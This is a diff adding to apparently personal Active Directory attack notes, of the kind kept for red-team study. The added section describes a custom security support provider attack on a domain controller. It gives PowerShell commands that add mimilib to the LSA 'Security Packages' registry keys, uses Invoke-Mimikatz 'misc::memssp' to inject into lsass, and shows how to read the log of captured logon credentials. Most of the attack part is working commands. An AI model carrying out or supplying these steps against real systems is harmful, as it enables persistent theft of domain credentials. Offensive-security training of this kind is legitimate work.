@@ -118,7 +118,37 @@ ls \\dcorp-dc\C$
 #### Attack
 - We can use either of the ways:
 	- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
-	- 
+
+```powershell
+$packages = Get-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
+Packages'| select -ExpandProperty 'Security Packages'
+```
+
+```powershell
+$packages += "mimilib"
+```
+
+```powershell
+Set-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
+Packages' -Value $packages
+```
+
+```powershell
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
+'Security Packages' -Value $packages
+```
+- Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
+```powershell
+Invoke-Mimikatz -Command '"misc::memssp"'
+```
+- All local logons on the DC are logged to:
+```powershell
+cat C:\Windows\system32\mimilsa.log
+```
+
+
 
 
 ---
